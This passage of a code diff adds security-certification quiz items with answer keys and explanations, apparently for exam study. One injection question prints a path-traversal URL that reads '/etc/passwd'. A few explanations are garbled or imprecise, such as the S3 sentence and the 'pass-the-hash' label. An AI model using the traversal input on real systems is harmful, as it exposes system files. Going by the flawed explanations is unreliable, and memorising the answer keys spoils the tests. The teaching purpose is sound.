+    explanation:"<strong>CRL (Certificate Revocation List)</strong> is a periodically published list of revoked certificates. <strong>OCSP (Online Certificate Status Protocol)</strong> provides real-time certificate status checking. OCSP Stapling improves performance by having the server cache the OCSP response. LDAP is a directory service, Kerberos is an authentication protocol, and X.509/PEM are certificate formats."
+  },
+  {
+    domain:"2.5 – PKI",
+    text:"What type of digital certificate is used to secure a web server and establish an HTTPS connection?",
+    options:["Code Signing Certificate","Email/S-MIME Certificate","SSL/TLS Server Certificate","Root CA Certificate"],
+    correct:2,
+    explanation:"An <strong>SSL/TLS Server Certificate</strong> (also called an X.509 certificate) is bound to a domain name and server. It enables HTTPS by allowing the client to verify the server's identity and establish an encrypted connection. Code signing certs authenticate software publishers, S/MIME certs secure email, and Root CA certs are the trust anchors in the PKI hierarchy — they should never be used directly on servers."
+  },
+  // ── DOMAIN 3: IMPLEMENTATION ───────────────────────────────────────────────
+  {
+    domain:"3.1 – Protocols & Services",
+    text:"Which protocol should replace Telnet for secure remote administration of network devices, and what encryption does it use?",
+    options:["RDP — uses TLS","SSH — uses asymmetric and symmetric encryption","HTTPS — uses TLS/SSL","SFTP — uses symmetric encryption only"],
+    correct:1,
+    explanation:"<strong>SSH (Secure Shell)</strong> is the secure replacement for Telnet, which transmits data in plaintext. SSH uses public-key cryptography for authentication and symmetric encryption (typically AES) for the session. It operates on port 22. It also underlies SFTP (secure file transfer) and SCP. RDP (port 3389) is for Windows remote desktop. HTTPS secures web traffic, not CLI remote access."
+  },
+  {
+    domain:"3.1 – Protocols & Services",
+    text:"A company implements DNSSEC on its domain. What does DNSSEC specifically protect against?",
+    options:["DDoS attacks against DNS servers","DNS cache poisoning and spoofing by cryptographically signing DNS records","Unauthorized zone transfers","Reconnaissance via DNS enumeration"],
+    correct:1,
+    explanation:"<strong>DNSSEC (DNS Security Extensions)</strong> adds cryptographic signatures to DNS records, allowing resolvers to verify that responses are authentic and unmodified. This directly prevents <strong>DNS cache poisoning</strong> and spoofing attacks. DNSSEC does not encrypt DNS traffic (that's DNS over HTTPS/TLS) and doesn't prevent DDoS or unauthorized zone transfers."
+  },
+  {
+    domain:"3.2 – Network Security",
+    text:"Which firewall type inspects packets by tracking the state of active connections and only allows packets that match an established, legitimate session?",
+    options:["Packet Filtering Firewall","Stateful Inspection Firewall","Application-Layer Firewall (WAF)","Next-Generation Firewall (NGFW)"],
+    correct:1,
+    explanation:"A <strong>Stateful Inspection Firewall</strong> maintains a state table of active connections and validates that incoming packets belong to a legitimate session. Packet filtering firewalls only examine individual packets without connection context. WAFs operate at Layer 7 specifically for web apps. NGFWs combine stateful inspection with deep packet inspection, application awareness, and IPS capabilities."
+  },
+  {
+    domain:"3.2 – Network Security",
+    text:"An IDS sensor is placed on a network segment and generates an alert for a known attack signature that matches benign traffic — the traffic was actually a valid SOAP API call. This is called a:",
+    options:["True Positive","False Positive","True Negative","False Negative"],
+    correct:1,
+    explanation:"A <strong>False Positive</strong> is an alert triggered by legitimate activity that was incorrectly flagged as malicious. High false positive rates reduce confidence in alerts and create alert fatigue. A False Negative is malicious activity that was NOT detected (worse from a security perspective). True Positive = real attack, correctly detected. True Negative = legitimate traffic, correctly allowed."
+  },
+  {
+    domain:"3.2 – Network Security",
+    text:"A company places web servers in a network zone that is accessible from the internet but separated from the internal LAN. This zone is called a:",
+    options:["VLAN","DMZ (Demilitarized Zone)","Air Gap","Screened Subnet"],
+    correct:1,
+    explanation:"A <strong>DMZ (Demilitarized Zone)</strong> is a network segment that hosts internet-facing services (web, email, DNS servers) while being isolated from the internal LAN by firewalls. Also called a <strong>screened subnet</strong>. The dual-firewall DMZ design uses two firewalls: one between the internet and DMZ, another between DMZ and internal network. A VLAN is a logical network segment; air gap is physical isolation."
+  },
+  {
+    domain:"3.2 – Network Security",
+    text:"Which wireless security protocol replaced WPA2 in 2018, offering Simultaneous Authentication of Equals (SAE) to prevent offline dictionary attacks?",
+    options:["WEP","WPA","WPA3","802.1X"],
+    correct:2,
+    explanation:"<strong>WPA3</strong> replaced WPA2 and introduced <strong>SAE (Simultaneous Authentication of Equals)</strong> — also called Dragonfly — which prevents offline dictionary attacks by requiring interaction with the access point to test each password guess. WPA3 also offers forward secrecy and 192-bit encryption mode for enterprise. WEP is broken, WPA had TKIP weaknesses, and 802.1X is an authentication framework used with WPA2/3 Enterprise."
+  },
+  {
+    domain:"3.3 – Identity and Access Management",
+    text:"A user authenticates using a password (something they know), a push notification to their phone (something they have), and a fingerprint scan (something they are). How many factors is this?",
+    options:["Single-Factor Authentication","Two-Factor Authentication (2FA)","Three-Factor Authentication (MFA)","Step-up Authentication"],
+    correct:2,
+    explanation:"This is <strong>Three-Factor Authentication</strong> — a form of <strong>MFA</strong> using all three traditional factor types: knowledge (password), possession (phone), and inherence (biometric). Using multiple factors from <em>different</em> categories is what makes MFA strong. Note: using two passwords would still be single-factor (both are 'something you know'). The more factors, the harder to compromise."
+  },
+  {
+    domain:"3.3 – Identity and Access Management",
+    text:"An employee moves from the Finance department to the IT department. Their old Finance permissions are never removed, and they accumulate IT permissions on top. Over time, they have excessive access. This is called:",
+    options:["Privilege Creep / Privilege Escalation","Separation of Duties violation","Least Privilege violation","Toxic Combination"],
+    correct:0,
+    explanation:"<strong>Privilege Creep</strong> (also called permission accumulation) occurs when users gradually accumulate access rights beyond what their current role requires — typically because old permissions are never revoked when roles change. The remedy is <strong>periodic access reviews (recertification)</strong> and enforcement of least privilege. Separation of duties ensures no single user can complete an entire sensitive process alone."
+  },
+  {
+    domain:"3.3 – Identity and Access Management",
+    text:"An organization uses a system where access decisions are based on user department, device health status, time of day, and geographic location simultaneously. This is:",
+    options:["Mandatory Access Control (MAC)","Role-Based Access Control (RBAC)","Attribute-Based Access Control (ABAC)","Discretionary Access Control (DAC)"],
+    correct:2,
+    explanation:"<strong>ABAC (Attribute-Based Access Control)</strong> makes access decisions based on a combination of attributes: subject attributes (user role, clearance, department), object attributes (classification, owner), and environment attributes (time, location, device health). This fine-grained model is more flexible than RBAC. RBAC assigns permissions to roles. MAC uses security labels. DAC lets resource owners control access."
+  },
+  {
+    domain:"3.3 – Identity and Access Management",
+    text:"A Kerberos authentication ticket contains a timestamp and expires after 8 hours. What attack does this time-limited ticket PRIMARILY prevent?",
+    options:["Pass-the-Hash","Replay Attack","Golden Ticket Attack","Kerberoasting"],
+    correct:1,
+    explanation:"Kerberos tickets include timestamps and have short lifetimes specifically to prevent <strong>replay attacks</strong> — where a captured ticket is reused. Clocks between client, KDC, and server must be synchronized (within 5 minutes by default). Pass-the-hash exploits NTLM, not Kerberos. Golden Ticket attacks forge Kerberos TGTs using the KRBTGT hash. Kerberoasting requests service tickets for offline cracking."
+  },
+  {
+    domain:"3.4 – Endpoint Security",
+    text:"An organization wants to prevent users from installing unauthorized applications on company laptops while still allowing IT-approved software. The BEST technical control is:",
+    options:["Host-Based IDS (HIDS)","Application Whitelisting / Allow-Listing","Full Disk Encryption","Antivirus Software"],
+    correct:1,
+    explanation:"<strong>Application Whitelisting (Allow-Listing)</strong> only permits pre-approved applications to execute, blocking everything else including unknown malware. It is considered one of the most effective endpoint controls. HIDS monitors for signs of compromise but doesn't prevent application installation. FDE protects data at rest. Antivirus uses signatures/heuristics but can miss zero-days."
+  },
+  {
+    domain:"3.4 – Endpoint Security",
+    text:"A laptop with full disk encryption (BitLocker) is stolen. The attacker removes the drive and connects it to their own machine. The data is:",
+    options:["Accessible — FDE only works when the OS is running","Protected — the encryption key is tied to the TPM chip or password","Partially accessible — only the OS partition is encrypted","Accessible if the attacker has the same OS version"],
+    correct:1,
+    explanation:"<strong>Full Disk Encryption (FDE)</strong> encrypts the entire drive, including the OS partition. Without the encryption key — which is typically tied to the <strong>TPM (Trusted Platform Module)</strong> and/or a PIN — the data is unreadable even if the drive is extracted. The TPM binds the decryption key to the specific hardware configuration, so transplanting the drive to another machine fails decryption."
+  },
+  {
+    domain:"3.5 – Cloud and Virtualization Security",
+    text:"An organization stores sensitive data in AWS S3. A misconfigured bucket policy allows public read access. This is BEST categorized as:",
+    options:["Data Loss Prevention failure","Cloud Security Misconfiguration / Insecure Cloud Storage","Unauthorized API access","Privilege Escalation"],
+    correct:1,
+    explanation:"<strong>Cloud Security Misconfiguration</strong> is the #1 cause of cloud data breaches. Misconfigured S3 buckets (public access enabled) have exposed billions of records. Proper controls include: disabling 'Block Public Access' is off by default in older AWS accounts, implementing IAM policies, enabling access logging, and using Cloud Security Posture Management (CSPM) tools to detect misconfigurations automatically."
+  },
+  {
+    domain:"3.5 – Cloud and Virtualization Security",
+    text:"A company uses containers for microservices. Each container runs as root inside the container. What security risk does this create?",
+    options:["Containers running as root have lower performance","If the container is compromised, the attacker may escalate to root on the host","Root containers cannot access the network","This is standard and recommended practice"],
+    correct:1,
+    explanation:"Running containers as root is dangerous because containers share the host OS kernel. If a container is compromised and an attacker exploits a <strong>container escape vulnerability</strong>, root inside the container may translate to root on the host. Best practice: run containers as non-root users using the <code>USER</code> directive in Dockerfiles, use read-only file systems, and apply pod security standards."
+  },
+  // ── DOMAIN 4: OPERATIONS AND INCIDENT RESPONSE ────────────────────────────
+  {
+    domain:"4.1 – Vulnerability Management",
+    text:"A vulnerability scan finds a CVSS 9.1 vulnerability on an isolated development server that stores no production data and is unreachable from the internet. The risk owner decides to accept this risk temporarily. This is called:",
+    options:["Risk Avoidance","Risk Transference","Risk Mitigation","Risk Acceptance"],
+    correct:3,
+    explanation:"<strong>Risk Acceptance</strong> is a conscious decision to acknowledge a risk without taking additional action — typically when the cost of remediation exceeds the potential impact or the risk is contextually low (isolated system, no sensitive data). Risk acceptance should be <em>documented</em> with a formal risk register entry, business justification, and review date. It is NOT ignoring risk — it is a deliberate, informed decision."
+  },
+  {
+    domain:"4.1 – Vulnerability Management",
+    text:"During a vulnerability scan, a finding is reported for software that is not actually installed on the system. This is called a:",
+    options:["True Positive","False Negative","False Positive","Zero-Day"],
+    correct:2,
+    explanation:"A <strong>False Positive</strong> in vulnerability scanning reports a vulnerability that doesn't actually exist or isn't exploitable in the target environment. False positives waste remediation effort and erode trust in scan results. They should be investigated and marked as exceptions after manual verification. False negatives (missed real vulnerabilities) are more dangerous from a security perspective."
+  },
+  {
+    domain:"4.1 – Vulnerability Management",
+    text:"A patch for a critical vulnerability has been available for 30 days but hasn't been deployed because it requires system downtime. The system is internet-facing. Which temporary measure can reduce exposure while awaiting the patch?",
+    options:["Accept the risk","Virtual Patching — deploy a WAF or IPS rule to block exploit attempts","Disable the system","Change the port the service runs on"],
+    correct:1,
+    explanation:"<strong>Virtual Patching</strong> (also called compensating controls) uses a WAF, IPS, or network firewall rule to block known exploit patterns for a vulnerability before the actual patch is applied. It reduces exposure without requiring downtime. It is a temporary measure — the actual patch should still be applied. Disabling the system may not be feasible for business-critical services. Port changes are easily overcome via scanning."
+  },
+  {
+    domain:"4.2 – Incident Response",
+    text:"What are the correct phases of the NIST SP 800-61 Incident Response lifecycle, in order?",
+    options:["Identify → Contain → Eradicate → Recover → Learn","Prepare → Detect & Analyze → Contain, Eradicate & Recover → Post-Incident Activity","Plan → Respond → Review → Improve","Detect → Respond → Remediate → Close"],
+    correct:1,
+    explanation:"The <strong>NIST SP 800-61</strong> incident response lifecycle has four phases: 1) <strong>Preparation</strong> (IR plan, tools, training), 2) <strong>Detection and Analysis</strong> (identify and validate incidents), 3) <strong>Containment, Eradication, and Recovery</strong> (stop the attack, remove it, restore systems), 4) <strong>Post-Incident Activity</strong> (lessons learned, documentation). This is a critical exam topic — know both NIST and SANS IR frameworks."
+  },
+  {
+    domain:"4.2 – Incident Response",
+    text:"During forensic investigation of a compromised Linux server, which volatile data source should be collected FIRST due to its ephemeral nature?",
+    options:["Hard drive image","System logs in /var/log","RAM / Memory dump","Network traffic PCAP"],
+    correct:2,
+    explanation:"The <strong>order of volatility</strong> (RFC 3227) dictates collecting the most ephemeral data first: 1) CPU registers/cache, 2) <strong>RAM/memory</strong>, 3) Network connections, 4) Running processes, 5) Disk. RAM contains encryption keys, running processes, network connections, and bash history that vanishes on power-off. Hard drive data persists and can be collected later. Always follow the order of volatility in digital forensics."
+  },
+  {
+    domain:"4.2 – Incident Response",
+    text:"An investigator creates a bit-for-bit copy of a hard drive using dd, records the SHA-256 hash of the original and copy, and stores both in an evidence locker with a sign-in log. These practices collectively maintain:",
+    options:["Digital forensic analysis","Chain of Custody","Incident classification","Evidence integrity only"],
+    correct:1,
+    explanation:"<strong>Chain of Custody</strong> is the documentation that tracks: who collected evidence, how it was collected, where it has been stored, who has accessed it, and when. Combined with <strong>hash verification</strong> (integrity), this ensures evidence is admissible in legal proceedings and hasn't been tampered with. The chain of custody starts at collection and must be unbroken. Any gap can make evidence inadmissible in court."
+  },
+  {
+    domain:"4.3 – Security Monitoring",
+    text:"A SIEM generates an alert when a user account attempts to log in from Nigeria at 2AM, then successfully authenticates from Los Angeles 3 minutes later. Which type of detection logic identified this?",
+    options:["Signature-based detection","Threshold-based alerting","Impossible Travel / Behavioral Analytics","Honeypot triggered"],
+    correct:2,
+    explanation:"<strong>Impossible Travel</strong> is a User and Entity Behavior Analytics (UEBA) rule that flags authentication events that are geographically impossible given the time elapsed between them (you cannot be in Nigeria and LA 3 minutes apart). This is a key detection for account compromise and credential theft. SIEM/UEBA platforms like Microsoft Sentinel and Splunk implement this as a built-in analytic."
+  },
+  {
+    domain:"4.3 – Security Monitoring",
+    text:"An analyst runs Wireshark on a host and observes regular outbound HTTPS connections to a known malware C2 domain at 5-minute intervals, even with no user activity. This is characteristic of:",
+    options:["Normal browser behavior","Beaconing — malware phoning home on a schedule","ARP scanning","DNS tunneling"],
+    correct:1,
+    explanation:"<strong>Beaconing</strong> is a classic malware behavior: the malware periodically contacts its C2 server on a fixed or jittered schedule to receive commands, exfiltrate data, or confirm it's still active. Regular intervals with no user activity are suspicious. Defenses include DNS filtering (blocking known C2 domains), behavioral network analysis, and egress filtering. Even if HTTPS, beaconing patterns are detectable via timing analysis."
+  },
+  {
+    domain:"4.4 – Penetration Testing",
+    text:"A penetration tester is hired with no knowledge of the internal network, mimicking an external attacker's perspective. This engagement type is called:",
+    options:["White Box Testing","Gray Box Testing","Black Box Testing","Red Team Exercise"],
+    correct:2,
+    explanation:"<strong>Black Box (Zero-Knowledge) Testing</strong> simulates an external attacker with no prior knowledge of the environment. The tester must perform full reconnaissance. White Box provides full internal knowledge (architecture, source code). Gray Box provides partial knowledge. A Red Team exercise is a comprehensive adversarial simulation that often includes physical and social engineering — broader than a standard penetration test."
+  },
+  {
+    domain:"4.4 – Penetration Testing",
+    text:"After a penetration test, the tester submits a report and all parties agree to keep findings confidential. The agreement signed BEFORE the engagement that limits liability and defines scope is called a:",
+    options:["Non-Disclosure Agreement (NDA) only","Rules of Engagement (RoE)","Statement of Work (SoW)","Master Service Agreement (MSA)"],
+    correct:1,
+    explanation:"The <strong>Rules of Engagement (RoE)</strong> document defines the scope, permitted techniques, excluded targets, time windows, and point of contact for a penetration test. It protects both the tester (authorization to attack) and client (limits what can be touched). An NDA covers confidentiality. A SoW defines deliverables and cost. The combination of authorization + RoE is essential — without written authorization, pen testing is illegal."
+  },
+  {
+    domain:"4.5 – Digital Forensics",
+    text:"A hard drive is suspected of containing illegal files. The investigator uses the evidence drive to boot their analysis workstation. Why is this a forensic mistake?",
+    options:["The drive may not be compatible with the workstation","Booting from the evidence drive may write data to it, altering evidence","It will erase all files on the drive","The BIOS will detect the illegal files"],
+    correct:1,
+    explanation:"Booting from evidence media can write to it — the OS may update timestamps, write swap files, or modify other metadata, <strong>altering the evidence</strong> and potentially making it inadmissible. Forensic best practices: 1) Create a verified copy first, 2) Use write blockers (hardware or software), 3) Work only from the copy, never the original. Always verify copies with cryptographic hashes before and after."
+  },
+  // ── DOMAIN 5: GOVERNANCE, RISK, AND COMPLIANCE ────────────────────────────
+  {
+    domain:"5.1 – Governance",
+    text:"Which document defines the ACCEPTABLE use of company IT resources by employees?",
+    options:["Incident Response Plan","Acceptable Use Policy (AUP)","Business Continuity Plan (BCP)","Data Classification Policy"],
+    correct:1,
+    explanation:"An <strong>Acceptable Use Policy (AUP)</strong> specifies what employees are and are not permitted to do with company IT systems (email, internet, devices). It sets expectations, reduces liability, and forms a legal basis for disciplinary action. It should be signed by all employees. An IRP covers security incidents, a BCP covers business continuity, and a data classification policy defines how to handle data by sensitivity."
+  },
+  {
+    domain:"5.1 – Governance",
+    text:"A company requires that no single employee can both approve and execute a financial transaction. This control is called:",
+    options:["Least Privilege","Separation of Duties (SoD)","Job Rotation","Dual Control"],
+    correct:1,
+    explanation:"<strong>Separation of Duties (SoD)</strong> ensures that completing a sensitive or high-risk task requires more than one person — preventing fraud, errors, and insider threats. In finance: one approves, another executes, a third reconciles. In IT: one developer writes code, another deploys it. Least privilege limits access to what's needed. Dual control requires two people simultaneously (e.g., nuclear launch). Job rotation detects fraud by rotating staff through roles."
+  },
+  {
+    domain:"5.2 – Risk Management",
+    text:"The formula for calculating risk is:",
+    options:["Risk = Threat + Vulnerability","Risk = Threat × Vulnerability × Asset Value","Risk = Likelihood × Impact","Risk = Asset Value ÷ Vulnerability"],
+    correct:2,
+    explanation:"The standard risk calculation: <strong>Risk = Likelihood × Impact</strong> (also expressed as Probability × Impact). This is used in risk matrices to prioritize risks. Threat × Vulnerability × Asset Value is another variant used in qualitative risk assessments. Understanding this formula underpins risk scoring, risk registers, and prioritization decisions in governance frameworks like NIST RMF, ISO 27001, and FAIR."
+  },
+  {
+    domain:"5.2 – Risk Management",
+    text:"A company purchases cyber liability insurance to cover the cost of a data breach. This is an example of:",
+    options:["Risk Mitigation","Risk Avoidance","Risk Transference","Risk Acceptance"],
+    correct:2,
+    explanation:"<strong>Risk Transference</strong> shifts the financial consequence of a risk to a third party — such as an insurer. Cyber insurance covers costs like breach notification, credit monitoring, legal fees, and regulatory fines. Note: insurance transfers <em>financial</em> risk only — the organization still bears reputational and operational risk. Risk mitigation reduces the risk itself, avoidance eliminates the activity, and acceptance acknowledges risk without action."
+  },
+  {
+    domain:"5.2 – Risk Management",
+    text:"An organization's risk register shows a risk with LOW likelihood but CRITICAL impact (e.g., major earthquake destroying the data center). How should this be prioritized?",
+    options:["Deprioritize — low likelihood means low risk","Prioritize highly — critical impact risks require mitigation regardless of likelihood","Only address if cost of mitigation is zero","Transfer only, no other action needed"],
+    correct:1,
+    explanation:"Risks with <strong>critical or catastrophic impact</strong> should be addressed even when likelihood is low, because the potential consequences are existential (business continuity failure, regulatory penalty, major financial loss). Business continuity and disaster recovery planning specifically target low-probability, high-impact events. The risk matrix places these in the 'address' quadrant despite low frequency."
+  },
+  {
+    domain:"5.3 – Compliance & Regulations",
+    text:"Which regulation specifically governs the protection of personal health information (PHI) in the United States?",
+    options:["PCI DSS","GDPR","HIPAA","SOX"],
+    correct:2,
+    explanation:"<strong>HIPAA (Health Insurance Portability and Accountability Act)</strong> protects <strong>PHI (Protected Health Information)</strong> in the US. It requires covered entities (healthcare providers, insurers) and their business associates to implement administrative, physical, and technical safeguards. PCI DSS governs payment card data, GDPR governs EU personal data, and SOX governs financial reporting for public companies."
+  },
+  {
+    domain:"5.3 – Compliance & Regulations",
+    text:"Under GDPR, an organization discovers a personal data breach. Within how many hours must they notify the supervisory authority?",
+    options:["24 hours","48 hours","72 hours","7 days"],
+    correct:2,
+    explanation:"<strong>GDPR Article 33</strong> requires notification to the supervisory authority within <strong>72 hours</strong> of becoming aware of a personal data breach — where it is likely to result in a risk to individuals' rights and freedoms. If notification is delayed beyond 72 hours, a documented reason must be provided. Notification to affected individuals (Art. 34) is required if the breach poses a high risk to their rights."
+  },
+  {
+    domain:"5.3 – Compliance & Regulations",
+    text:"Which security framework is SPECIFICALLY designed for securing cardholder data environments (CDE) in organizations that process payment cards?",
+    options:["ISO 27001","NIST Cybersecurity Framework","PCI DSS","CIS Controls"],
+    correct:2,
+    explanation:"<strong>PCI DSS (Payment Card Industry Data Security Standard)</strong> is a mandatory standard for any organization that stores, processes, or transmits cardholder data. It specifies 12 requirements covering firewalls, encryption, access control, and monitoring. Non-compliance can result in fines, increased transaction fees, and loss of card processing ability. ISO 27001 and NIST CSF are general information security frameworks."
+  },
+  {
+    domain:"5.4 – Business Continuity",
+    text:"An organization's RTO is 4 hours and its RPO is 2 hours. What do these metrics mean in practice?",
+    options:["Systems must be restored within 4 hours; data can be lost up to 2 hours worth","Data must be restored in 4 hours; systems can be down 2 hours","Both metrics mean the same thing — maximum outage time","RPO defines recovery point, RTO defines maximum response time to start recovery"],
+    correct:0,
+    explanation:"<strong>RTO (Recovery Time Objective)</strong> = maximum acceptable time to restore a system/service after disruption (here: 4 hours of downtime is acceptable). <strong>RPO (Recovery Point Objective)</strong> = maximum acceptable data loss expressed in time (here: backups must occur at least every 2 hours, so ≤2 hours of data loss is acceptable). RTO drives recovery process design; RPO drives backup frequency. Together they define your DR requirements."
+  },
+  {
+    domain:"5.4 – Business Continuity",
+    text:"A disaster recovery site has all hardware, software, and current data replicated in real time. It can take over within minutes. This type of site is called a:",
+    options:["Cold Site","Warm Site","Hot Site","Tertiary Site"],
+    correct:2,
+    explanation:"A <strong>Hot Site</strong> is a fully operational DR site with hardware, software, and near-real-time data replication — it can take over within minutes to hours. Most expensive option. A <strong>Warm Site</strong> has hardware and software but requires loading recent backups (hours to days). A <strong>Cold Site</strong> has only physical space and utilities — equipment must be procured and configured (days to weeks). Choose based on RTO requirements."
+  },
+  // ── ADDITIONAL MIXED QUESTIONS ─────────────────────────────────────────────
+  {
+    domain:"1.2 – Advanced Malware",
+    text:"A malware sample changes its own code each time it replicates to evade signature-based detection while keeping its core malicious function. This is called:",
+    options:["Armored Malware","Polymorphic Malware","Metamorphic Malware","Encrypted Malware"],
+    correct:1,
+    explanation:"<strong>Polymorphic malware</strong> mutates its code (changes encryption keys, adds junk code, reorders instructions) while preserving its payload. Each copy has a different signature, defeating traditional AV. <em>Metamorphic</em> malware is even more sophisticated — it rewrites its entire code logic, not just obfuscation. <em>Armored</em> malware resists disassembly/analysis. Heuristic and behavioral detection are needed against polymorphic threats."
+  },
+  {
+    domain:"1.3 – Injection Attacks",
+    text:"An attacker modifies a URL from <code>…/files/report.pdf</code> to <code>…/files/../../etc/passwd</code> and retrieves the system's password file. This is called:",
+    options:["SQL Injection","Path Traversal / Directory Traversal","File Inclusion Attack","Command Injection"],
+    correct:1,
+    explanation:"<strong>Path Traversal (Directory Traversal)</strong> uses <code>../</code> sequences to navigate outside the intended web root directory, accessing files the application shouldn't expose. The <code>..</code> sequences move up the directory tree to reach sensitive OS files. Prevention: canonicalize and validate all file path inputs, use chroot jails, and never allow user-controlled input to directly determine file paths."
+  },
+  {
+    domain:"2.3 – Secure Protocols",
+    text:"A developer uses HTTP for their login page because 'the password is already hashed in JavaScript before submission.' Why is this still insecure?",
+    options:["JavaScript hashing is not a recognized standard","HTTP transmits the hash in plaintext — an attacker can intercept and replay the hash without knowing the original password","HTTP is only insecure on public networks","Hash functions are reversible"],
+    correct:1,
+    explanation:"Sending a hash over HTTP is a <strong>pass-the-hash vulnerability</strong> — if the hash is intercepted, the attacker doesn't need the plaintext password; they can simply replay the captured hash to authenticate. HTTPS (TLS) must protect the entire authentication flow, and password hashing must be done server-side with salting to be meaningful. Client-side hashing without TLS provides a false sense of security."
+  },
+  {
+    domain:"3.1 – Email Security",
+    text:"Which email authentication mechanism publishes cryptographic public keys in DNS and allows receiving mail servers to verify that emails were signed by the domain's authorized mail server?",
+    options:["SPF","DKIM","DMARC","S/MIME"],
+    correct:1,
+    explanation:"<strong>DKIM (DomainKeys Identified Mail)</strong> adds a cryptographic signature to email headers, allowing receiving servers to verify authenticity using a public key published in DNS. <strong>SPF</strong> specifies which IP addresses are authorized to send email for a domain. <strong>DMARC</strong> builds on SPF and DKIM to define policy (reject/quarantine) for failed authentication. Together, SPF + DKIM + DMARC prevent email spoofing."
+  },
+  {
+    domain:"3.2 – Load Balancers & Availability",
+    text:"Which availability concept ensures that a single component failure does not bring down an entire system?",
+    options:["High Availability (HA)","Redundancy / Elimination of Single Points of Failure","Fault Tolerance","Load Balancing"],
+    correct:1,
+    explanation:"Eliminating <strong>Single Points of Failure (SPOFs)</strong> through <strong>redundancy</strong> is the architectural principle of having backup components for every critical system element (power supplies, network links, servers). <em>High Availability</em> is the goal (e.g., 99.999% uptime). <em>Fault Tolerance</em> allows a system to continue operating even during component failure. <em>Load balancing</em> distributes traffic but also provides redundancy if configured for failover."
+  },
+  {
+    domain:"2.4 – Hashing",
+    text:"Which of the following is a cryptographic hash function currently recommended for digital signatures and certificate generation?",
+    options:["MD5","SHA-1","SHA-256 (SHA-2 family)","CRC32"],
+    correct:2,
+    explanation:"<strong>SHA-256</strong> (part of the SHA-2 family) is currently recommended for cryptographic use. MD5 and SHA-1 are both broken — collisions (two inputs with the same hash) have been demonstrated for both. CRC32 is a checksum for error detection, not cryptography. SHA-3 is the latest NIST standard. The SHA-2 family (SHA-256, SHA-384, SHA-512) is the current baseline."
+  },
+  {
+    domain:"3.3 – Privileged Access",
+    text:"An administrator is required to check out credentials from a vault, use them for a specific task, and have them automatically rotated afterward. The system logs all activity. This is a function of:",
+    options:["Identity Provider (IdP)","Privileged Access Management (PAM)","Single Sign-On (SSO)","RADIUS"],
+    correct:1,
+    explanation:"<strong>PAM (Privileged Access Management)</strong> solutions (like CyberArk, BeyondTrust) vault privileged credentials, enforce just-in-time access, record privileged sessions, and rotate credentials automatically. This limits exposure of admin passwords and creates an audit trail. IdP handles authentication identity, SSO enables one login for multiple systems, and RADIUS is a network authentication protocol."
+  },
+  {
+    domain:"4.3 – Log Management",
+    text:"A SIEM collects logs from firewalls, Active Directory, endpoints, and cloud services. An analyst creates a rule to detect brute-force login attempts across these sources. What capability does this represent?",
+    options:["Data Loss Prevention","Security Information and Event Management (SIEM) — Log Correlation","Network Traffic Analysis","Endpoint Detection and Response (EDR)"],
+    correct:1,
+    explanation:"<strong>SIEM</strong> aggregates and normalizes logs from disparate sources and applies <strong>correlation rules</strong> to detect attack patterns that span multiple systems. A brute-force may show failed logins in AD, blocked connections in firewall logs, and process creation events on endpoints — SIEM connects these dots. EDR focuses on endpoint telemetry. DLP prevents data exfiltration. NTA analyzes network flows."
+  },
+  {
+    domain:"1.4 – Wireless Attacks",
+    text:"An attacker sets up a rogue access point with the same SSID as a corporate Wi-Fi network. Employees' devices automatically connect. This is called an:",
+    options:["Deauthentication Attack","Evil Twin Attack","Disassociation Attack","BlueSnarfing"],
+    correct:1,
+    explanation:"An <strong>Evil Twin</strong> (rogue AP) attack sets up a malicious access point mimicking a legitimate network SSID. Devices configured to auto-connect to known networks will connect to the attacker's AP, enabling MitM interception. Mitigations: 802.1X enterprise authentication (devices verify the AP's certificate), VPN enforcement, and wireless intrusion detection. Deauthentication attacks force clients to disconnect, often to redirect to an evil twin."
+  },
+  {
+    domain:"4.1 – Threat Hunting",
+    text:"A security analyst proactively searches through network telemetry and endpoint data for signs of compromise without a prior alert triggering the investigation. This practice is called:",
+    options:["Vulnerability Scanning","Threat Hunting","Penetration Testing","Security Audit"],
+    correct:1,
+    explanation:"<strong>Threat Hunting</strong> is a proactive, hypothesis-driven search for undetected threats that have evaded automated controls. Unlike reactive incident response (starting with an alert), threat hunters start with a hypothesis (e.g., 'what if APT X has already compromised us?') and investigate. Effective threat hunting improves detection capabilities by identifying gaps and creating new SIEM rules from findings."
+  },
+  {
+    domain:"5.1 – Security Policies",
+    text:"An employee is terminated. Which account action should security perform IMMEDIATELY upon termination, even before IT finishes the standard offboarding checklist?",
+    options:["Delete all email archives","Disable/revoke all system access and credentials","Change the employee's password to a temporary one","Notify HR of the termination"],
+    correct:1,
+    explanation:"<strong>Immediate access revocation</strong> upon termination is critical to prevent insider threat and unauthorized access. This includes disabling AD accounts, revoking VPN certificates, removing SSO sessions, and changing any shared credentials the employee knew. This is a time-sensitive control — terminated employees with lingering access have caused significant data breaches. The order should be: revoke access first, then complete other offboarding steps."
+  },
+  {
+    domain:"3.1 – VPN Technologies",
+    text:"Which VPN protocol provides OS-level VPN that works over port 443 (HTTPS) and is therefore rarely blocked by firewalls, while using TLS for encryption?",
+    options:["IPsec/IKEv2","L2TP/IPsec","SSL/TLS VPN (OpenVPN / SSTP)","PPTP"],
+    correct:2,
+    explanation:"<strong>SSL/TLS VPNs</strong> (OpenVPN, SSTP, Cisco AnyConnect) operate over port 443, which is almost universally open because it's the same port as HTTPS. This makes them ideal for remote access when traditional IPsec (ports 500/4500) may be blocked. IPsec/IKEv2 offers better performance but has firewall challenges. L2TP/IPsec can be blocked. PPTP is obsolete and cryptographically broken — it should never be used."
+  },
+  {
+    domain:"2.1 – Supply Chain Security",
+    text:"Malicious code was inserted into a widely-used open-source library's official build pipeline. Thousands of downstream applications are affected. This is called a:",
+    options:["Zero-Day Attack","Supply Chain Attack","Watering Hole Attack","Typosquatting"],
+    correct:1,
+    explanation:"A <strong>Supply Chain Attack</strong> targets the software supply chain — compromising build pipelines, repositories, dependencies, or third-party vendors to introduce malware into legitimate software distributed to downstream users. The SolarWinds attack (SUNBURST) is a landmark example. Defense includes: Software Bill of Materials (SBOM), code signing, dependency verification, and secure build pipelines (SLSA framework)."
+  },
+  {
+    domain:"3.4 – Mobile Device Security",
+    text:"An organization allows employees to use personal phones for work email. The MDM policy can remotely wipe corporate data but not personal apps. This device management model is called:",
+    options:["COPE — Corporate Owned, Personally Enabled","BYOD — Bring Your Own Device with containerization","CYOD — Choose Your Own Device","COBO — Corporate Owned, Business Only"],
+    correct:1,
